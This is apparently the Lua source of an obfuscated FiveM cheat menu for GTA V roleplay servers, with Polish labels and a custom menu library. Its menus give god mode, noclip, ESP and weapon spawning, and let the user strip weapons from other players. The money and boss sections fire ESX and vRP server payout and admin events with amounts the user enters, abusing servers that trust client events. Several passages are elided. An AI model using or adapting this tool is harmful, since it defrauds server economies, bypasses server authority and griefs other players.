...
local menus = {}
local keys = {up = 172, down = 173, left = 163, right = 175, select = 176, back = 177}
local optionCount = 14

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.25
local titleHeight = 0.03
local titleYOffset = 0.005
local titleScale = 0.300

local fasijotjkurwMenu123ButtonHeight = 0.038
local fasijotjkurwMenu123ButtonFont = 0
local fasijotjkurwMenu123ButtonScale = 0.300
local fasijotjkurwMenu123ButtonTextXOffset = 0.005
local fasijotjkurwMenu123ButtonTextYOffset = 0.005

local function debugPrint(text)
	if fasijotjkurw.debug then
...
local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	...
	if menus[currentMenu] then
		...
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - fasijotjkurwMenu123ButtonTextXOffset)
...
local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + fasijotjkurwMenu123ButtonHeight / 2
		...
		drawRect(x, y, menuWidth, fasijotjkurwMenu123ButtonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + fasijotjkurwMenu123ButtonTextXOffset,
			y - fasijotjkurwMenu123ButtonHeight / 2 + fasijotjkurwMenu123ButtonTextYOffset,
			fasijotjkurwMenu123ButtonFont,
			subTitleColor,
			fasijotjkurwMenu123ButtonScale,
			false
		)
...
local function drawfasijotjkurwMenu123Button(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	...
	if multiplier then
		local y = menus[currentMenu].y + titleHeight + fasijotjkurwMenu123ButtonHeight + (fasijotjkurwMenu123ButtonHeight * multiplier) - fasijotjkurwMenu123ButtonHeight / 2
		...
		drawRect(x, y, menuWidth, fasijotjkurwMenu123ButtonHeight, backgroundColor)
		drawText(
			text,
			menus[currentMenu].x + fasijotjkurwMenu123ButtonTextXOffset,
			y - (fasijotjkurwMenu123ButtonHeight / 2) + fasijotjkurwMenu123ButtonTextYOffset,
...
function fasijotjkurw.fasijotjkurwMenu123CreateMenu(id, title)
	...
	menus[id].titleColor = {r = 1, g = 0, b = 0, a = 255}
	Citizen.CreateThreadNow(
		function()
			while true do
				Citizen.Wait(0)
				local ra = RGBRainbow(1.0)				
				menus[id].titleBackgroundColor = {r = 255, g = 214, b = 102, a = 0}
				menus[id].menuFocusBackgroundColor = {r = 43, g = 43, b = 43, a = 255}
			end
		end)
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 255, g = 214, b = 102, a = 255}
	menus[id].menuFocusTextColor = {r = 48, g = 48, b = 48, a = 255}
	--menus[id].menuFocusBackgroundColor = { r = 203, g = 99, b = 224, a = 255 }
	menus[id].menuBackgroundColor = {r = 48, g = 46, b = 46, a = 100}
	...
	menus[id].fasijotjkurwMenu123ButtonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} 

	debugPrint(tostring(id) .. " menu created")
end

function fasijotjkurw.fasijotjkurwMenu123CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		fasijotjkurw.fasijotjkurwMenu123CreateMenu(id, menus[parent].title)
...
function fasijotjkurw.CurrentMenu()
	return currentMenu
end

function fasijotjkurw.OpenMenu(id)
	if id and menus[id] then
...
function fasijotjkurw.fasijotjkurwMenu123IsMenuOpened(id)
	return isMenuVisible(id)
end

function fasijotjkurw.IsAnyMenuOpened()
...
function fasijotjkurw.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
...
function fasijotjkurw.CloseMenu()
	if menus[currentMenu] then
...
function fasijotjkurw.fasijotjkurwMenu123Button(text, subText)
	local fasijotjkurwMenu123ButtonText = text
	if subText then
		fasijotjkurwMenu123ButtonText = "{ " .. tostring(fasijotjkurwMenu123ButtonText) .. ", " .. tostring(subText) .. " }"
	end
	...
	if menus[currentMenu] then
		...
		drawfasijotjkurwMenu123Button(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].fasijotjkurwMenu123ButtonPressedSound.name, menus[currentMenu].fasijotjkurwMenu123ButtonPressedSound.set, true)
				debugPrint(fasijotjkurwMenu123ButtonText .. " fasijotjkurwMenu123Button pressed")
				return true
		...
		debugPrint("Failed to create " .. fasijotjkurwMenu123ButtonText .. " fasijotjkurwMenu123Button: " .. tostring(currentMenu) .. " menu doesn't exist")

		return false
	end
end

function fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button(text, id)
	if menus[id] then
		if fasijotjkurw.fasijotjkurwMenu123Button(text) then
			setMenuVisible(currentMenu, false)
		...
		debugPrint("Failed to create " .. tostring(text) .. " menu fasijotjkurwMenu123Button: " .. tostring(id) .. " submenu doesn't exist")
	end

	return false
end

function fasijotjkurw.CheckBox(text, bool, callback)
	local checked = "~r~~h~OFF"
	if bool then
		checked = "~g~~h~ON"
	end

	if fasijotjkurw.fasijotjkurwMenu123Button(text, checked) then
		bool = not bool
...
function fasijotjkurw.ComboBox(text, items, currentIndex, selectedIndex, callback)
	...
	if fasijotjkurw.fasijotjkurwMenu123Button(text, selectedItem) then
...
function fasijotjkurw.fasijotjkurwMenu123Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			fasijotjkurw.CloseMenu()
		else
...
function fasijotjkurw.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function fasijotjkurw.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function fasijotjkurw.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function fasijotjkurw.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function fasijotjkurw.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function fasijotjkurw.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
...
function fasijotjkurw.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function fasijotjkurw.fasijotjkurwMenu123SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function fasijotjkurw.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
...
function fasijotjkurw.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function fasijotjkurw.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function fasijotjkurw.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function fasijotjkurw.SetfasijotjkurwMenufasijotjkurwMenu123ButtonPressedSound(id, name, set)
	setMenuProperty(id, "fasijotjkurwMenu123ButtonPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	fasijotjkurwMenu123DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true
...
Citizen.CreateThreadNow(
	function()
		while Enabled do
			...
			function sdkjfhlssdfoidfugopdfuisgopudsfpg(HzrWJelKRFLdfoigudofgudfgidfg, vn6uFWdfgpiudpofgipdfg)
				if vn6uFWdfgpiudpofgipdfg then
					local rd4JRDIAkW3gfdogiudfoigodfgdfg = 10 ^ vn6uFWdfgpiudpofgipdfg
					return math.floor((HzrWJelKRFLdfoigudofgudfgidfg * rd4JRDIAkW3gfdogiudfoigodfgdfg) + 0.5) / (rd4JRDIAkW3gfdogiudfoigodfgdfg)
				else
					return math.floor(HzrWJelKRFLdfoigudofgudfgidfg + 0.5)
				end
			end
			
			function kjsdhglksddfgdfgjuydoifgjodifgdfg(i8CKVcdfpogiudofgdfgfg, wPHjsIoyC9ofdiugodigdfgdfg, iCQfY4nodifugoidfgdfgdfg)
				SetEntityCoordsNoOffset(i8CKVcdfpogiudofgdfgfg, wPHjsIoyC9ofdiugodigdfgdfg.x, wPHjsIoyC9ofdiugodigdfgdfg.y, wPHjsIoyC9ofdiugodigdfgdfg.z, false, false, false, true)
				NetworkResurrectLocalPlayer(wPHjsIoyC9ofdiugodigdfgdfg.x, wPHjsIoyC9ofdiugodigdfgdfg.y, wPHjsIoyC9ofdiugodigdfgdfg.z, iCQfY4nodifugoidfgdfgdfg, true, false)
				SetPlayerInvincible(i8CKVcdfpogiudofgdfgfg, false)
				TriggerHugeVEventhdsifkisdhfikosdjlkfsdfsdf(false, "playerSpawned", wPHjsIoyC9ofdiugodigdfgdfg.x, wPHjsIoyC9ofdiugodigdfgdfg.y, wPHjsIoyC9ofdiugodigdfgdfg.z)
				ClearPedBloodDamage(i8CKVcdfpogiudofgdfgfg)
			end
			
			function kjsdhfilsudhusdgfddifukhgyidfgdfg()
				local zLXwr6t9ybAtDpdfgoiudfogdfg = GetEntityCoords(PlayerPedId())
				local sKquZDsjk7h0GINRoufdigoudfgdfg = {
					x = sdkjfhlssdfoidfugopdfuisgopudsfpg(zLXwr6t9ybAtDpdfgoiudfogdfg.x, 1),
					y = sdkjfhlssdfoidfugopdfuisgopudsfpg(zLXwr6t9ybAtDpdfgoiudfogdfg.y, 1),
					z = sdkjfhlssdfoidfugopdfuisgopudsfpg(zLXwr6t9ybAtDpdfgoiudfogdfg.z, 1)
				}
				kjsdhglksddfgdfgjuydoifgjodifgdfg(PlayerPedId(), sKquZDsjk7h0GINRoufdigoudfgdfg, 0)
				StopScreenEffect("DeathFailOut")
			end

			TriggerHugeVEventhdsifkisdhfikosdjlkfsdfsdf=function(is_serverhifgdkgdfg,eventdfklgjlgfhfg,...)
			...
			fasijotjkurwMenu123DisplayRadar(true)
...
Citizen.CreateThreadNow(
	function()
		...
		fasijotjkurw.fasijotjkurwMenu123CreateMenu("MainMenu", "")
		fasijotjkurw.fasijotjkurwMenu123SetSubTitle("MainMenu", "VERSION V1.0 | EDIT BY POTEZNY DEVELOPA JEBAC SKAZE")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("SelfMenu", "MainMenu", "PlayerMenu")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("World", "MainMenu", "World")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("Peds", "MainMenu", "Peds")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("ModeleSkinow", "Peds", "Modele Skinow")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("Fuck", "MainMenu", "Fuck")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("ServerMenu", "MainMenu", "LUA Execution")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("TworcyMenu", "MainMenu", "tworcy")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("TeleportMenu", "MainMenu", "TeleportRawQ Menu")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("WepMenu", "MainMenu", "Weapon Menu")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("SingleWepMenu", "WepMenu", "Single Weapon Menu")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("ESXMoney", "ServerMenu", "Money Options")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		fasijotjkurw.fasijotjkurwMenu123CreateSubMenu("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")

		local SelectedPlayer

		while Enabled do
			if fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("MainMenu") then
				   if fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("» ~s~ ~r~∑ ~s~Opcje ~h~Własne!                                                      ", "SelfMenu", "💰") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("» ~s~ ~p~∑ ~s~Opcje ~h~Podglądania!                                             ", "OnlinePlayerMenu") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("» ~s~ ~m~∑ ~s~Opcje ~h~Visual!                                                            ", "World") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("» ~s~ ~b~∑ ~s~Opcje ~h~Teleportu!                                                  ", "TeleportMenu") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("» ~s~ ~g~∑ ~s~Opcje ~h~Pojazdu!                                              ", "VehMenu") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("» ~s~ ~o~∑ ~s~Opcje ~h~Broni!                                                        ", "WepMenu") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("» ~s~ ~u~∑ ~s~Opcje ~h~Rozpierdalania!                                                ", "Fuck") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("» ~s~ ~g~∑ ~s~Opcje ~h~Servera!                                      ", "ServerMenu") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("» ~s~ ~g~∑ ~s~Opcje Peda!                                             ", "Peds") then
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~p~JEBAC SKAZE ~c~ 🔒 ~r~CLICK TO LEAVE!") then
					Enabled = false
				end

				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("Peds") then
				if fasijotjkurw.fasijotjkurwMenu123Button("~g~Reset Model To FiveM Player") then
			...
			elseif fasijotjkurw.fasijotjkurwMenu123Button("Change To ~p~Clown") then
					...
					elseif fasijotjkurw.fasijotjkurwMenu123Button("Change To ~r~Stripper") then
					local model = "s_f_y_stripper_01"
						...
						if HasModelLoaded(GetHashKey(model)) then
							...
							elseif fasijotjkurw.fasijotjkurwMenu123Button("Change To ~b~Cop") then
					local model = "s_m_y_cop_01"
						...
						if HasModelLoaded(GetHashKey(model)) then
							...
							elseif fasijotjkurw.fasijotjkurwMenu123Button("Change To ~o~Chimp") then
					local model = "a_c_chimp"
						...
						if HasModelLoaded(GetHashKey(model)) then
							...
							elseif fasijotjkurw.fasijotjkurwMenu123Button("Change To ~g~Alien") then
					local model = "s_m_m_movalien_01"
						...
						if HasModelLoaded(GetHashKey(model)) then
							...
							elseif fasijotjkurw.fasijotjkurwMenu123Button("Change To ~p~Pongo") then
					local model = "u_m_y_pogo_01"
						...
						if HasModelLoaded(GetHashKey(model)) then
							...
							elseif fasijotjkurw.fasijotjkurwMenu123Button("Change To ~o~Babyd") then
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("bizness") then

				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("SelfMenu") then
				if
					fasijotjkurw.CheckBox(
						"~h~~g~God ~h~~r~Mode",
						Godmode,
						function(enabled)
							Godmode = enabled
				 ...
				 then
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~Revive", "~g~ESX") then
					TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent('ambulancier:selfRespawn')
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~Revive", "~r~Native") then
					kjsdhfilsudhusdgfddifukhgyidfgdfg()
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~Refil Heal") then
					SetEntityHealth(PlayerPedId(), 200)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~b~Refil Armor") then
					SetPedArmour(PlayerPedId(), 200)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~w~Set Hunger to ~h~~g~100%", "~w~( ~r~BAN 50/50 ~w~)") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~w~Set Hunger to ~h~~g~100%", "~w~( ~r~BAN 50/50 ~w~)") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~b~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~b~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
				elseif
				fasijotjkurw.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				fasijotjkurw.CheckBox(
					"~h~Super Jump",
				...
				then
				elseif
				fasijotjkurw.CheckBox("~h~Fast Run ~r~NEW",fastrun,function(enabled)fastrun = enabled end)
			 	then
				elseif
				fasijotjkurw.CheckBox(
					"~h~Invisible",
				...
				then
				elseif
				fasijotjkurw.CheckBox("~h~NoClip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end

		fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("TeleportMenu") then
				if fasijotjkurw.fasijotjkurwMenu123Button("~h~Teleport ~h~~g~Waypoint") then
				TeleportToWaypoint()
			 elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Teleport ~h~~g~Vehicle ~r~FIX ") then
		...
		fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("World") then
			if
				fasijotjkurw.CheckBox(
				"~h~ESP",
				esp,
		...
		fasijotjkurw.fasijotjkurwMenu123Display()
		elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("Fuck") then
		if fasijotjkurw.fasijotjkurwMenu123Button('~h~~p~#~s~ Spawn Peds', 'SpawnPeds') then
		end
		if fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~Give All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~Remove All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
	...
	then
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("WepMenu") then
				if fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("~h~Specific Weapon", "SingleWepMenu") then
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~g~Give ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~Remove ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~b~Give Ammo") then
					for i = 1, #allWeapons do
						AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
					end
				elseif
					fasijotjkurw.ComboBox(
			...
			elseif
				...
				elseif
				 ...
				 then
				 elseif
					 fasijotjkurw.CheckBox("~h~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 fasijotjkurw.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end

				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("SingleWepMenu") then
				for i = 1, #allWeapons do
					if fasijotjkurw.fasijotjkurwMenu123Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end

				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("VehMenu") then
				if fasijotjkurw.fasijotjkurwMenu123Button("~h~~g~Spawn Vehicle") then
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Repair Vehicle") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Max Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Max mechanics ~r~new") then
				...
				then
			    elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~b~Change License Plate~r~ NEW") then
					local playerPed = GetPlayerPed(-1)
				...
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~Delete Vehicle") then
					DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle Deleted")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle is now dirty")
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~h~Make vehicle clean") then
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("ServerMenu") then
				if fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("~s~Menu ~h~~r~RECRUIT PLAYERS", "RecrutarPlayers") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("~s~Menu ~b~~h~BOSS", "ESXBoss") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("~s~Menu ~g~~h~MONEY", "ESXMoney") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("~s~Menu ~p~~h~DRUGS", "ESXDrugs") then
				elseif fasijotjkurw.fasijotjkurwMenufasijotjkurwMenu123Button("~s~Menu ~o~~h~OTHERS", "ESXMisc") then
				end

				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("ESXBoss") then
				if fasijotjkurw.fasijotjkurwMenu123Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~c~~h~Mafia~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~ESX ~y~Custom Boss Menu") then
				...
				fasijotjkurw.fasijotjkurwMenu123Display()
			elseif fasijotjkurw.fasijotjkurwMenu123IsMenuOpened("ESXMoney") then
				if fasijotjkurw.fasijotjkurwMenu123Button("~h~~r~-»~r~~h~ BEST MONEY «-") then
			...
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, CAUTION ~s~1") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, TRUCKER ~s~2") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, ADMIN BANK ~s~3") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, ADMIN ~s~4") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, GOPOSTAL ~s~5") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, BANKSEC ~s~6") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, SLOT ~s~7") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, LSC ~s~8") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, SLOT ~s~9") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, BRUDNA ~s~10") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, TRUCKERJOB ~s~11") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, DOSTAWA ~s~12") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, TAXI(WYBOR) ~s~13") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, TAXI ~s~14") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, GARBAGEJOB ~s~15") then
				local result = KeyboardInput("Wpisz kwote pieniedzy", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif fasijotjkurw.fasijotjkurwMenu123Button("~g~~h~MONEY, WYPLATA ~s~16") then
				...
				TriggerServerEvent('paycheck:salary')
